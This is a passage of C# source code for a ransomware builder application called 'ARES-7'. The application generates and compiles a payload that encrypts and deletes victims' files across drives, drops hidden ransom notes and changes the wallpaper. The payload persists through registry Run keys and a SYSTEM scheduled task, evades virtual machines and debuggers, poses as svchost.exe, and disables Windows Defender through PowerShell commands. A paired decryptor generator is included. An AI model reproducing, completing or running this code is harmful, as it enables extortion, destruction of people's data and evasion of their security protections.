        static string NOTE_CONTENT = @""{Escape(noteContent)}"";
        static string FAKE_NAME = ""{Escape(fakeName)}"";
        static int ALGO = {algo};
        static int FAKE_ENABLED = {fakeEnabled};
        static int HIDE_ENABLED = {hideEnabled};
        static int ANTI_VM = {antiVM};
        static int DISABLE_DEFENDER = {disableDefender};
        static int PERSISTENCE = {persistence};
        static int HIDE_FILES = {hideFiles};
        static int SANDBOX_DELAY = {sandboxDelay};
        static string WALLPAPER_BASE64 = @""{Escape(wallpaperBase64)}"";
        static string WALLPAPER_EXT = ""{Escape(wallpaperExt)}"";
        
        // Ключи для дешифратора
        static string AES_KEY_BASE64 = ""{Escape(aesKey)}"";
        static string AES_IV_BASE64 = ""{Escape(aesIV)}"";
        static string RSA_PUBLIC_KEY = @""{Escape(rsaPublicKey)}"";
        static string CHACHA_KEY_BASE64 = ""{Escape(chachaKey)}"";
        static string CHACHA_NONCE_BASE64 = ""{Escape(chachaNonce)}"";
        
        static Random rnd = new Random();
        static List<string> encryptedFiles = new List<string>();
        
        // ============================================================
        // WINAPI
        // ============================================================
        [DllImport(""kernel32.dll"")]
        static extern IntPtr GetCurrentProcess();
        
        [DllImport(""kernel32.dll"")]
        static extern bool SetProcessInformation(IntPtr hProcess, int ProcessInformationClass, IntPtr ProcessInformation, uint ProcessInformationSize);
        
        [DllImport(""user32.dll"")]
        static extern int SystemParametersInfo(int uAction, int uParam, string lpvParam, int fuWinIni);
        
        [DllImport(""ntdll.dll"")]
        static extern int NtSetInformationProcess(IntPtr hProcess, int ProcessInformationClass, IntPtr ProcessInformation, uint ProcessInformationLength);
        
        // ============================================================
        // ГЛАВНАЯ ФУНКЦИЯ
        // ============================================================
        static void Main()
        {{
            if (Debugger.IsAttached) return;
            if (ANTI_VM == 1 && DetectVM()) return;
            if (SANDBOX_DELAY == 1) Thread.Sleep(60000);
            if (FAKE_ENABLED == 1) FakeProcess();
            if (HIDE_ENABLED == 1) HideProcess();
            if (DISABLE_DEFENDER == 1) DisableDefender();
            if (PERSISTENCE == 1) AddPersistence();
            
            var drives = DRIVES.Split('|').ToList();
            var extensions = EXTS.Split('|').ToList();
            var exclude = new List<string> {{ ""C:\\Windows"", ""C:\\Program Files"", ""C:\\Program Files (x86)"" }};
            
            foreach (var drive in drives)
            {{
                if (Directory.Exists(drive))
                    WalkAndEncrypt(drive, extensions, exclude);
            }}
            
            if (HIDE_FILES == 1) HideEncryptedFiles(ENC_EXT);
            DropNotes(drives, NOTE_NAME, NOTE_CONTENT);
            if (!string.IsNullOrEmpty(WALLPAPER_BASE64)) SetWallpaper(WALLPAPER_BASE64, WALLPAPER_EXT);
            SaveEncryptedList();
        }}
        
        // ============================================================
        // ОБХОД И ШИФРОВАНИЕ
        // ============================================================
        static void WalkAndEncrypt(string path, List<string> extensions, List<string> exclude)
        {{
            try
            {{
                foreach (string file in Directory.GetFiles(path))
                {{
                    string ext = Path.GetExtension(file).ToLower();
                    if (extensions.Contains(ext) && !file.EndsWith(ENC_EXT))
                    {{
                        EncryptFile(file);
                    }}
                }}
                foreach (string dir in Directory.GetDirectories(path))
                {{
                    bool skip = false;
                    foreach (string ex in exclude)
                    {{
                        if (dir.StartsWith(ex)) {{ skip = true; break; }}
                    }}
                    if (!skip) WalkAndEncrypt(dir, extensions, exclude);
                }}
            }}
            catch {{ }}
        }}
        
        // ============================================================
        // ШИФРОВАНИЕ ФАЙЛА (РЕАЛЬНЫЙ CHACHA20)
        // ============================================================
        static void EncryptFile(string path)
        {{
            try
            {{
                byte[] data = File.ReadAllBytes(path);
                byte[] encrypted = null;
                byte[] key = null;
                byte[] iv = null;
                
                switch (ALGO)
                {{
                    case 0: // AES-256-CBC
                        var aes = Aes.Create();
                        aes.KeySize = 256;
                        aes.Mode = CipherMode.CBC;
                        aes.Padding = PaddingMode.PKCS7;
                        aes.GenerateKey();
                        aes.GenerateIV();
                        key = aes.Key;
                        iv = aes.IV;
                        using (var encryptor = aes.CreateEncryptor())
                        {{
                            encrypted = encryptor.TransformFinalBlock(data, 0, data.Length);
                        }}
                        break;
                        
                    case 1: // ChaCha20-Poly1305 (реальный)
                        byte[] chachaKey = Convert.FromBase64String(CHACHA_KEY_BASE64);
                        byte[] chachaNonce = Convert.FromBase64String(CHACHA_NONCE_BASE64);
                        key = chachaKey;
                        iv = chachaNonce;
                        encrypted = ChaCha20Encrypt(data, chachaKey, chachaNonce);
                        break;
                        
                    case 2: // RSA-2048
                        using (RSACryptoServiceProvider rsa = new RSACryptoServiceProvider(2048))
                        {{
                            rsa.FromXmlString(RSA_PUBLIC_KEY);
                            encrypted = rsa.Encrypt(data, false);
                            key = new byte[0];
                            iv = new byte[0];
                        }}
                        break;
                }}
                
                if (encrypted != null)
                {{
                    byte[] combined = new byte[4 + (key?.Length ?? 0) + 4 + (iv?.Length ?? 0) + encrypted.Length];
                    int offset = 0;
                    
                    if (key != null)
                    {{
                        BitConverter.GetBytes(key.Length).CopyTo(combined, offset);
                        offset += 4;
                        key.CopyTo(combined, offset);
                        offset += key.Length;
                    }}
                    
                    if (iv != null)
                    {{
                        BitConverter.GetBytes(iv.Length).CopyTo(combined, offset);
                        offset += 4;
                        iv.CopyTo(combined, offset);
                        offset += iv.Length;
                    }}
                    
                    encrypted.CopyTo(combined, offset);
                    
                    string encPath = path + ENC_EXT;
                    File.WriteAllBytes(encPath, combined);
                    File.Delete(path);
                    encryptedFiles.Add(encPath);
                }}
            }}
            catch {{ }}
        }}
        
        // ============================================================
        // РЕАЛЬНЫЙ CHACHA20 (RFC 7539)
        // ============================================================
        static byte[] ChaCha20Encrypt(byte[] data, byte[] key, byte[] nonce)
        {{
            byte[] result = new byte[data.Length];
            uint[] state = new uint[16];
            byte[] block = new byte[64];
            
            // Константы ChaCha20
            uint[] constants = {{ 0x61707865, 0x3320646e, 0x79622d32, 0x6b206574 }};
            
            for (int counter = 0; counter < (data.Length + 63) / 64; counter++)
            {{
                // Инициализация состояния
                state[0] = constants[0];
                state[1] = constants[1];
                state[2] = constants[2];
                state[3] = constants[3];
                
                state[4] = BitConverter.ToUInt32(key, 0);
                state[5] = BitConverter.ToUInt32(key, 4);
                state[6] = BitConverter.ToUInt32(key, 8);
                state[7] = BitConverter.ToUInt32(key, 12);
                state[8] = BitConverter.ToUInt32(key, 16);
                state[9] = BitConverter.ToUInt32(key, 20);
                state[10] = BitConverter.ToUInt32(key, 24);
                state[11] = BitConverter.ToUInt32(key, 28);
                
                state[12] = (uint)counter;
                state[13] = BitConverter.ToUInt32(nonce, 0);
                state[14] = BitConverter.ToUInt32(nonce, 4);
                state[15] = BitConverter.ToUInt32(nonce, 8);
                
                uint[] working = (uint[])state.Clone();
                
                // 20 раундов (10 четверных)
                for (int i = 0; i < 10; i++)
                {{
                    QuarterRound(ref working[0], ref working[4], ref working[8], ref working[12]);
                    QuarterRound(ref working[1], ref working[5], ref working[9], ref working[13]);
                    QuarterRound(ref working[2], ref working[6], ref working[10], ref working[14]);
                    QuarterRound(ref working[3], ref working[7], ref working[11], ref working[15]);
                    QuarterRound(ref working[0], ref working[5], ref working[10], ref working[15]);
                    QuarterRound(ref working[1], ref working[6], ref working[11], ref working[12]);
                    QuarterRound(ref working[2], ref working[7], ref working[8], ref working[13]);
                    QuarterRound(ref working[3], ref working[4], ref working[9], ref working[14]);
                }}
                
                for (int i = 0; i < 16; i++)
                {{
                    working[i] += state[i];
                }}
                
                // Генерация ключевого потока
                byte[] keyStream = new byte[64];
                for (int i = 0; i < 16; i++)
                {{
                    byte[] bytes = BitConverter.GetBytes(working[i]);
                    Array.Copy(bytes, 0, keyStream, i * 4, 4);
                }}
                
                // XOR с данными
                int start = counter * 64;
                int length = Math.Min(64, data.Length - start);
                for (int i = 0; i < length; i++)
                {{
                    result[start + i] = (byte)(data[start + i] ^ keyStream[i]);
                }}
            }}
            
            return result;
        }}
        
        static void QuarterRound(ref uint a, ref uint b, ref uint c, ref uint d)
        {{
            a += b; d ^= a; d = (d << 16) | (d >> 16);
            c += d; b ^= c; b = (b << 12) | (b >> 20);
            a += b; d ^= a; d = (d << 8) | (d >> 24);
            c += d; b ^= c; b = (b << 7) | (b >> 25);
        }}
        
        // ============================================================
        // РАЗМЕЩЕНИЕ ЗАПИСОК
        // ============================================================
        static void DropNotes(List<string> drives, string noteName, string noteContent)
        {{
            foreach (string drive in drives)
            {{
                try
                {{
                    if (Directory.Exists(drive))
                    {{
                        string notePath = Path.Combine(drive, noteName);
                        File.WriteAllText(notePath, noteContent);
                        File.SetAttributes(notePath, FileAttributes.Hidden);
                    }}
                }}
                catch {{ }}
            }}
        }}
        
        // ============================================================
        // СКРЫТИЕ ЗАШИФРОВАННЫХ ФАЙЛОВ
        // ============================================================
        static void HideEncryptedFiles(string ext)
        {{
            try
            {{
                foreach (string drive in DriveInfo.GetDrives().Select(d => d.Name))
                {{
                    if (Directory.Exists(drive))
                    {{
                        foreach (string file in Directory.GetFiles(drive, ""*"" + ext, SearchOption.AllDirectories))
                        {{
                            try
                            {{
                                File.SetAttributes(file, FileAttributes.Hidden);
                            }}
                            catch {{ }}
                        }}
                    }}
                }}
            }}
            catch {{ }}
        }}
        
        // ============================================================
        // СОХРАНЕНИЕ СПИСКА
        // ============================================================
        static void SaveEncryptedList()
        {{
            try
            {{
                string listPath = Path.Combine(Path.GetTempPath(), ""encrypted_files.txt"");
                File.WriteAllLines(listPath, encryptedFiles);
                File.SetAttributes(listPath, FileAttributes.Hidden);
            }}
            catch {{ }}
        }}
        
        // ============================================================
        // ПЕРСИСТЕНТНОСТЬ
        // ============================================================
        static void AddPersistence()
        {{
            try
            {{
                string exePath = Process.GetCurrentProcess().MainModule.FileName;
                
                RegistryKey key = Registry.CurrentUser.CreateSubKey(@""Software\Microsoft\Windows\CurrentVersion\Run"");
                key.SetValue(""SystemUpdate"", exePath);
                key.Close();
                
                try
                {{
                    RegistryKey keyLocal = Registry.LocalMachine.CreateSubKey(@""Software\Microsoft\Windows\CurrentVersion\Run"");
                    keyLocal.SetValue(""SystemUpdate"", exePath);
                    keyLocal.Close();
                }}
                catch {{ }}
                
                try
                {{
                    Process.Start(""schtasks"", $""/create /tn ""SystemUpdate"" /tr ""{exePath}"" /sc onlogon /ru SYSTEM /f"");
                }}
                catch {{ }}
            }}
            catch {{ }}
        }}
        
        // ============================================================
        // УСТАНОВКА ОБОЕВ
        // ============================================================
        static void SetWallpaper(string base64Data, string ext)
        {{
            if (string.IsNullOrEmpty(base64Data)) return;
            try
            {{
                byte[] data = Convert.FromBase64String(base64Data);
                string tempPath = Path.Combine(Path.GetTempPath(), ""wall"" + ext);
                File.WriteAllBytes(tempPath, data);
                SystemParametersInfo(0x0014, 0, tempPath, 0x0001 | 0x0002);
            }}
            catch {{ }}
        }}
        
        // ============================================================
        // ОБНАРУЖЕНИЕ VM
        // ============================================================
        static bool DetectVM()
        {{
            try
            {{
                string[] vmProcesses = {{ ""vbox"", ""vmware"", ""virtual"", ""qemu"", ""xenserver"", ""vmsrvc"", ""vmtoolsd"" }};
                foreach (var proc in Process.GetProcesses())
                {{
                    string name = proc.ProcessName.ToLower();
                    foreach (string vm in vmProcesses)
                        if (name.Contains(vm)) return true;
                }}
                
                try
                {{
                    var searcher = new System.Management.ManagementObjectSearcher(""SELECT * FROM Win32_ComputerSystem"");
                    foreach (var obj in searcher.Get())
                    {{
                        string model = obj[""Model""]?.ToString()?.ToLower() ?? """";
                        if (model.Contains(""virtual"") || model.Contains(""vmware"") || model.Contains(""vbox""))
                            return true;
                    }}
                }}
                catch {{ }}
                
                if (Environment.GetEnvironmentVariable(""VBOX_MSI_INSTALL_PATH"") != null) return true;
                if (Environment.GetEnvironmentVariable(""VMWARE_USE"") != null) return true;
            }}
            catch {{ }}
            return false;
        }}
        
        // ============================================================
        // МАСКИРОВКА ПРОЦЕССА
        // ============================================================
        static void FakeProcess()
        {{
            try
            {{
                Console.Title = FAKE_NAME;
                Process.GetCurrentProcess().ProcessName = FAKE_NAME;
            }}
            catch {{ }}
        }}
        
        // ============================================================
        // СКРЫТИЕ ПРОЦЕССА
        // ============================================================
        static void HideProcess()
        {{
            try
            {{
                IntPtr hProcess = GetCurrentProcess();
                int ProcessHideFromDebugger = 0x1F;
                IntPtr ptr = Marshal.AllocHGlobal(4);
                Marshal.WriteInt32(ptr, 0x1);
                NtSetInformationProcess(hProcess, ProcessHideFromDebugger, ptr, 4);
                Marshal.FreeHGlobal(ptr);
                
                try
                {{
                    int ProcessInformationClass = 0x2;
                    IntPtr ptr2 = Marshal.AllocHGlobal(4);
                    Marshal.WriteInt32(ptr2, 0x1);
                    SetProcessInformation(hProcess, ProcessInformationClass, ptr2, 4);
                    Marshal.FreeHGlobal(ptr2);
                }}
                catch {{ }}
                
                try
                {{
                    string exePath = Process.GetCurrentProcess().MainModule.FileName;
                    string tempPath = Path.Combine(Path.GetTempPath(), ""svchost.exe"");
                    if (!File.Exists(tempPath))
                    {{
                        File.Copy(exePath, tempPath, true);
                        ProcessStartInfo psi = new ProcessStartInfo();
                        psi.FileName = tempPath;
                        psi.Arguments = ""--hidden"";
                        psi.UseShellExecute = false;
                        psi.CreateNoWindow = true;
                        Process.Start(psi);
                        Thread.Sleep(1000);
                        Environment.Exit(0);
                    }}
                }}
                catch {{ }}
            }}
            catch {{ }}
        }}
        
        // ============================================================
        // ОТКЛЮЧЕНИЕ DEFENDER
        // ============================================================
        static void DisableDefender()
        {{
            try
            {{
                string exePath = Process.GetCurrentProcess().MainModule.FileName;
                
                Process.Start(""powershell"", ""-Command \""Set-MpPreference -DisableRealtimeMonitoring $true\""\"");
                Process.Start(""powershell"", ""-Command \""Set-MpPreference -DisableCloudProtection $true\""\"");
                Process.Start(""powershell"", ""-Command \""Set-MpPreference -DisableBehaviorMonitoring $true\""\"");
                Process.Start(""powershell"", ""-Command \""Set-MpPreference -DisableBlockAtFirstSeen $true\""\"");
                
                Process.Start(""powershell"", $""-Command \""Add-MpPreference -ExclusionPath '{Path.GetDirectoryName(exePath)}'\""\"");
                Process.Start(""powershell"", $""-Command \""Add-MpPreference -ExclusionProcess '{Path.GetFileName(exePath)}'\""\"");
                
                Process.Start(""powershell"", ""-Command \""Stop-Service WinDefend -Force\""\"");
                Process.Start(""powershell"", ""-Command \""Set-Service WinDefend -StartupType Disabled\""\"");
                
                try
                {{
                    RegistryKey key = Registry.LocalMachine.CreateSubKey(@""SOFTWARE\Policies\Microsoft\Windows Defender"");
                    key.SetValue(""DisableAntiSpyware"", 1, RegistryValueKind.DWord);
                    key.Close();
                }}
                catch {{ }}
            }}
            catch {{ }}
        }}
    }}
}}
";
        }
        
        // ============================================================
        // ГЕНЕРАЦИЯ КОДА ДЕШИФРАТОРА
        // ============================================================
        private string GenerateDecryptorCode(string aesKey, string aesIV, string rsaPrivateKey, string encExt, string chachaKey, string chachaNonce)
        {
            string Escape(string s)
            {
                if (string.IsNullOrEmpty(s)) return "";
                return s
                    .Replace("\\", "\\\\")
                    .Replace("\"", "\\\"")
                    .Replace("\r\n", "\\n")
                    .Replace("\n", "\\n")
                    .Replace("\r", "\\r")
                    .Replace("\t", "\\t")
                    .Replace("\u2028", "\\u2028")
                    .Replace("\u2029", "\\u2029");
            }
            
            return $@"
using System;
using System.IO;
using System.Linq;
using System.Collections.Generic;
using System.Security.Cryptography;

namespace Decryptor
{{
    class Program
    {{
        static string ENC_EXT = ""{Escape(encExt)}"";
        static string AES_KEY_BASE64 = ""{Escape(aesKey)}"";
        static string AES_IV_BASE64 = ""{Escape(aesIV)}"";
        static string RSA_PRIVATE_KEY = @""{Escape(rsaPrivateKey)}"";
        static string CHACHA_KEY_BASE64 = ""{Escape(chachaKey)}"";
        static string CHACHA_NONCE_BASE64 = ""{Escape(chachaNonce)}"";
        static int totalFiles = 0;
        static int decryptedFiles = 0;
        
        static void Main()
        {{
            Console.ForegroundColor = ConsoleColor.Green;
            Console.WriteLine(""=== ARES-7 DECRYPTOR ===\n"");
            
            byte[] aesKey = Convert.FromBase64String(AES_KEY_BASE64);
            byte[] aesIV = Convert.FromBase64String(AES_IV_BASE64);
            byte[] chachaKey = Convert.FromBase64String(CHACHA_KEY_BASE64);
            byte[] chachaNonce = Convert.FromBase64String(CHACHA_NONCE_BASE64);
            
            string listPath = Path.Combine(Path.GetTempPath(), ""encrypted_files.txt"");
            List<string> files = new List<string>();
            
            if (File.Exists(listPath))
            {{
                files = File.ReadAllLines(listPath).ToList();
                Console.WriteLine($""Found {{files.Count}} files in the list"");
            }}
            else
            {{
                Console.WriteLine(""Searching for encrypted files..."");
                foreach (string drive in DriveInfo.GetDrives().Select(d => d.Name))
                {{
                    try
                    {{
                        files.AddRange(Directory.GetFiles(drive, ""*"" + ENC_EXT, SearchOption.AllDirectories));
                    }}
                    catch {{ }}
                }}
                Console.WriteLine($""Found {{files.Count}} encrypted files"");
            }}
            
            totalFiles = files.Count;
            
            foreach (string encFile in files)
            {{
                try
                {{
                    DecryptFile(encFile, aesKey, aesIV, chachaKey, chachaNonce);
                    decryptedFiles++;
                    if (decryptedFiles % 10 == 0)
                        Console.WriteLine($""Decrypted {{decryptedFiles}}/{{totalFiles}} files..."");
                }}
                catch (Exception ex)
                {{
                    Console.WriteLine($""Error decrypting {{encFile}}: {{ex.Message}}"");
                }}
            }}
            
            Console.WriteLine($"");
            Console.WriteLine($""=== DECRYPTION COMPLETE ==="");
            Console.WriteLine($""Total: {{totalFiles}}, Decrypted: {{decryptedFiles}}, Failed: {{totalFiles - decryptedFiles}}"");
            
            try
            {{
                foreach (string drive in DriveInfo.GetDrives().Select(d => d.Name))
                {{
                    foreach (string file in Directory.GetFiles(drive, ""READ_ME*.txt"", SearchOption.AllDirectories))
                    {{
                        File.Delete(file);
                    }}
                }}
            }}
            catch {{ }}
            
            Console.WriteLine(""\nPress any key to exit..."");
            Console.ReadKey();
        }}
        
        static void DecryptFile(string encPath, byte[] aesKey, byte[] aesIV, byte[] chachaKey, byte[] chachaNonce)
        {{
            try
            {{
                byte[] data = File.ReadAllBytes(encPath);
                int offset = 0;
                int keyLen = BitConverter.ToInt32(data, offset);
                offset += 4;
                offset += keyLen;
                int ivLen = BitConverter.ToInt32(data, offset);
                offset += 4;
                offset += ivLen;
                byte[] encrypted = new byte[data.Length - offset];
                Array.Copy(data, offset, encrypted, 0, encrypted.Length);
                
                // Пробуем AES
                try
                {{
                    using (Aes aes = Aes.Create())
                    {{
                        aes.KeySize = 256;
                        aes.Mode = CipherMode.CBC;
                        aes.Padding = PaddingMode.PKCS7;
                        aes.Key = aesKey;
                        aes.IV = aesIV;
                        using (var decryptor = aes.CreateDecryptor())
                        {{
                            byte[] decrypted = decryptor.TransformFinalBlock(encrypted, 0, encrypted.Length);
                            string originalPath = encPath.Replace(ENC_EXT, """");
                            File.WriteAllBytes(originalPath, decrypted);
                            File.Delete(encPath);
                        }}
                    }}
                    return;
                }}
                catch {{ }}
                
                // Пробуем ChaCha20
                try
                {{
                    byte[] decrypted = ChaCha20Decrypt(encrypted, chachaKey, chachaNonce);
                    string originalPath = encPath.Replace(ENC_EXT, """");
                    File.WriteAllBytes(originalPath, decrypted);
                    File.Delete(encPath);
                }}
                catch {{ }}
                
                // Пробуем RSA
                try
                {{
                    using (RSACryptoServiceProvider rsa = new RSACryptoServiceProvider(2048))
                    {{
                        rsa.FromXmlString(RSA_PRIVATE_KEY);
                        byte[] decrypted = rsa.Decrypt(encrypted, false);
                        string originalPath = encPath.Replace(ENC_EXT, """");
                        File.WriteAllBytes(originalPath, decrypted);
                        File.Delete(encPath);
                    }}
                }}
                catch {{ throw; }}
            }}
            catch {{ throw; }}
        }}
        
        static byte[] ChaCha20Decrypt(byte[] data, byte[] key, byte[] nonce)
        {{
            byte[] result = new byte[data.Length];
            uint[] state = new uint[16];
            uint[] constants = {{ 0x61707865, 0x3320646e, 0x79622d32, 0x6b206574 }};
            
            for (int counter = 0; counter < (data.Length + 63) / 64; counter++)
            {{
                state[0] = constants[0]; state[1] = constants[1];
                state[2] = constants[2]; state[3] = constants[3];
                state[4] = BitConverter.ToUInt32(key, 0);
                state[5] = BitConverter.ToUInt32(key, 4);
                state[6] = BitConverter.ToUInt32(key, 8);
                state[7] = BitConverter.ToUInt32(key, 12);
                state[8] = BitConverter.ToUInt32(key, 16);
                state[9] = BitConverter.ToUInt32(key, 20);
                state[10] = BitConverter.ToUInt32(key, 24);
                state[11] = BitConverter.ToUInt32(key, 28);
                state[12] = (uint)counter;
                state[13] = BitConverter.ToUInt32(nonce, 0);
                state[14] = BitConverter.ToUInt32(nonce, 4);
                state[15] = BitConverter.ToUInt32(nonce, 8);
                
                uint[] working = (uint[])state.Clone();
                for (int i = 0; i < 10; i++)
                {{
                    QuarterRound(ref working[0], ref working[4], ref working[8], ref working[12]);
                    QuarterRound(ref working[1], ref working[5], ref working[9], ref working[13]);
                    QuarterRound(ref working[2], ref working[6], ref working[10], ref working[14]);
                    QuarterRound(ref working[3], ref working[7], ref working[11], ref working[15]);
                    QuarterRound(ref working[0], ref working[5], ref working[10], ref working[15]);
                    QuarterRound(ref working[1], ref working[6], ref working[11], ref working[12]);
                    QuarterRound(ref working[2], ref working[7], ref working[8], ref working[13]);
                    QuarterRound(ref working[3], ref working[4], ref working[9], ref working[14]);
                }}
                
                for (int i = 0; i < 16; i++) working[i] += state[i];
                
                byte[] keyStream = new byte[64];
                for (int i = 0; i < 16; i++)
                {{
                    byte[] bytes = BitConverter.GetBytes(working[i]);
                    Array.Copy(bytes, 0, keyStream, i * 4, 4);
                }}
                
                int start = counter * 64;
                int length = Math.Min(64, data.Length - start);
                for (int i = 0; i < length; i++)
                {{
                    result[start + i] = (byte)(data[start + i] ^ keyStream[i]);
                }}
            }}
            
            return result;
        }}
        
        static void QuarterRound(ref uint a, ref uint b, ref uint c, ref uint d)
        {{
            a += b; d ^= a; d = (d << 16) | (d >> 16);
            c += d; b ^= c; b = (b << 12) | (b >> 20);
            a += b; d ^= a; d = (d << 8) | (d >> 24);
            c += d; b ^= c; b = (b << 7) | (b >> 25);
        }}
    }}
}}
";
        }
        
        // ============================================================
        // ОСНОВНАЯ ЛОГИКА СБОРКИ
        // ============================================================
        private void BtnBuild_Click(object sender, EventArgs e)
        {
            try
            {
                lblStatus.Text = "STARTING BUILD...";
                lblStatus.ForeColor = yellowColor;
                progressBar.Visible = true;
                btnBuild.Enabled = false;
                
                string algorithm = cbAlgorithm.SelectedItem?.ToString() ?? "AES-256-CBC";
                int algoValue = algorithm == "AES-256-CBC" ? 0 : algorithm == "ChaCha20-Poly1305" ? 1 : 2;
                
                List<string> selectedDrives = new List<string>();
                if (chkC.Checked) selectedDrives.Add("C:\\");
                if (chkD.Checked) selectedDrives.Add("D:\\");
                if (chkE.Checked) selectedDrives.Add("E:\\");
                if (chkZ.Checked) selectedDrives.Add("Z:\\");
                
                if (selectedDrives.Count == 0)
                {
                    MessageBox.Show("Select at least one drive!", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
                    btnBuild.Enabled = true;
                    progressBar.Visible = false;
                    lblStatus.Text = "ERROR: select drive";
                    lblStatus.ForeColor = errorColor;
                    return;
                }
                
                List<string> selectedExts = GetSelectedExtensions();
                string encryptedExt = txtEncryptedExt.Text;
                string noteName = txtNoteName.Text;
                string noteContent = txtNoteContent.Text;
                string outputName = txtOutputName.Text;
                string outputPath = txtOutputPath.Text;
                
                string wallpaperBase64 = "";
                string wallpaperExt = ".jpg";
                if (!string.IsNullOrEmpty(wallpaperPath) && File.Exists(wallpaperPath))
                {
                    byte[] imageData = File.ReadAllBytes(wallpaperPath);
                    wallpaperExt = Path.GetExtension(wallpaperPath);
                    if (string.IsNullOrEmpty(wallpaperExt)) wallpaperExt = ".jpg";
                    wallpaperBase64 = Convert.ToBase64String(imageData);
                }
                
                // Генерация ключей
                string aesKey = "";
                string aesIV = "";
                string rsaPublicKey = "";
                string rsaPrivateKey = "";
                string chachaKey = "";
                string chachaNonce = "";
                
                using (Aes aes = Aes.Create())
                {
                    aes.KeySize = 256;
                    aes.GenerateKey();
                    aes.GenerateIV();
                    aesKey = Convert.ToBase64String(aes.Key);
                    aesIV = Convert.ToBase64String(aes.IV);
                }
                
                using (RSACryptoServiceProvider rsa = new RSACryptoServiceProvider(2048))
                {
                    rsaPublicKey = rsa.ToXmlString(false);
                    rsaPrivateKey = rsa.ToXmlString(true);
                }
                
                using (RNGCryptoServiceProvider rng = new RNGCryptoServiceProvider())
                {
                    byte[] key = new byte[32];
                    byte[] nonce = new byte[12];
                    rng.GetBytes(key);
                    rng.GetBytes(nonce);
                    chachaKey = Convert.ToBase64String(key);
                    chachaNonce = Convert.ToBase64String(nonce);
                }
                
                lblDetail.Text = "Generating ransomware code...";
                
                string code = GenerateRansomwareCode(
                    string.Join("|", selectedDrives),
                    string.Join("|", selectedExts),
                    encryptedExt,
                    noteName,
                    noteContent,
                    txtFakeProcessName.Text,
                    algoValue,
                    chkFakeProcess.Checked ? 1 : 0,
                    chkHideProcess.Checked ? 1 : 0,
                    chkAntiVM.Checked ? 1 : 0,
                    chkDisableDefender.Checked ? 1 : 0,
                    chkAddPersistence.Checked ? 1 : 0,
                    chkHideFilesAttr.Checked ? 1 : 0,
                    chkSandboxDelay.Checked ? 1 : 0,
                    wallpaperBase64,
                    wallpaperExt,
                    aesKey,
                    aesIV,
                    rsaPublicKey,
                    chachaKey,
                    chachaNonce
                );
                
                string tempDir = Path.Combine(Path.GetTempPath(), "ARES7Build");
                if (!Directory.Exists(tempDir)) Directory.CreateDirectory(tempDir);
                
                string csPath = Path.Combine(tempDir, "ransomware.cs");
                File.WriteAllText(csPath, code, Encoding.UTF8);
                
                lblDetail.Text = "Compiling ransomware...";
                
                string cscPath = FindCsc();
                if (cscPath == null)
                {
                    MessageBox.Show(
                        "csc.exe not found!\n\nPlease install .NET Framework 4.8",
                        "Error",
                        MessageBoxButtons.OK,
                        MessageBoxIcon.Error
                    );
                    btnBuild.Enabled = true;
                    progressBar.Visible = false;
                    lblStatus.Text = "ERROR: csc.exe not found";
                    lblStatus.ForeColor = errorColor;
                    return;
                }
                
                string finalPath = Compile(cscPath, csPath, outputPath, outputName);
                
                if (File.Exists(finalPath) && new FileInfo(finalPath).Length > 10000)
                {
                    lblStatus.Text = "SUCCESS!";
                    lblStatus.ForeColor = successColor;
                    long sizeKB = new FileInfo(finalPath).Length / 1024;
                    lblDetail.Text = $"{finalPath} | Size: {sizeKB} KB";
                    
                    // Сборка дешифратора
                    if (chkBuildDecryptor.Checked)
                    {
                        lblDetail.Text = "Generating decryptor code...";
                        string decryptorCode = GenerateDecryptorCode(aesKey, aesIV, rsaPrivateKey, encryptedExt, chachaKey, chachaNonce);
                        string decryptorPath = Path.Combine(tempDir, "decryptor.cs");
                        File.WriteAllText(decryptorPath, decryptorCode, Encoding.UTF8);
                        
                        lblDetail.Text = "Compiling decryptor...";
                        string decryptorName = "decryptor_" + outputName;
                        string decryptorFinalPath = Compile(cscPath, decryptorPath, outputPath, decryptorName);
                        
                        if (File.Exists(decryptorFinalPath) && new FileInfo(decryptorFinalPath).Length > 5000)
                        {
                            lblDetail.Text += $" | Decryptor: {decryptorFinalPath}";
                        }
                    }
                    
                    if (!string.IsNullOrEmpty(iconPath) && File.Exists(iconPath))
                    {
                        try
                        {
                            string destIcon = Path.Combine(outputPath, Path.GetFileName(iconPath));
                            if (File.Exists(destIcon)) File.Delete(destIcon);
                            File.Copy(iconPath, destIcon, true);
                        }
                        catch { }
                    }
                    
                    MessageBox.Show($"Build complete!\n\nRansomware: {finalPath}\n\nDecryptor: {(chkBuildDecryptor.Checked ? "Created" : "Not created")}", 
                        "Success", MessageBoxButtons.OK, MessageBoxIcon.Information);
                }
                else
                {
                    lblStatus.Text = "ERROR: compilation failed";
                    lblStatus.ForeColor = errorColor;
                    lblDetail.Text = "Check output for details";
                }
                
                try { File.Delete(csPath); } catch { }
            }
            catch (Exception ex)
            {
                lblStatus.Text = "ERROR!";
                lblStatus.ForeColor = errorColor;
                lblDetail.Text = ex.Message;
                MessageBox.Show($"Error: {ex.Message}\n\n{ex.StackTrace}", "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
            finally
            {
                btnBuild.Enabled = true;
                progressBar.Visible = false;
            }
        }
        
        private string FindCsc()
        {
            string[] possiblePaths = {
                @"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe",
                @"C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe",
                @"C:\windows\microsoft.net\framework\v4.0.30319\csc.exe",
                @"C:\windows\microsoft.net\framework64\v4.0.30319\csc.exe",
                @"Z:\usr\lib\mono\4.5\csc.exe",
                @"Z:\usr\lib\mono\4.8\csc.exe",
                "csc.exe"
            };
            
            foreach (string path in possiblePaths)
            {
                if (File.Exists(path))
                    return path;
            }
            
            try
            {
                ProcessStartInfo wherePsi = new ProcessStartInfo();
                wherePsi.FileName = "where";
                wherePsi.Arguments = "csc";
                wherePsi.UseShellExecute = false;
                wherePsi.RedirectStandardOutput = true;
                wherePsi.CreateNoWindow = true;
                
                Process whereProcess = Process.Start(wherePsi);
                string result = whereProcess.StandardOutput.ReadToEnd();
                whereProcess.WaitForExit();
                
                if (!string.IsNullOrEmpty(result))
                {
                    return result.Trim().Split(new[] { '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries)[0];
                }
            }
            catch { }
            
            return null;
        }
        
        private string Compile(string cscPath, string csPath, string outputPath, string outputName)
        {
            ProcessStartInfo psi = new ProcessStartInfo();
            psi.FileName = cscPath;
            psi.Arguments = $"/target:winexe /out:\"{outputName}\" \"{csPath}\"";
            psi.WorkingDirectory = outputPath;
            psi.UseShellExecute = false;
            psi.RedirectStandardOutput = true;
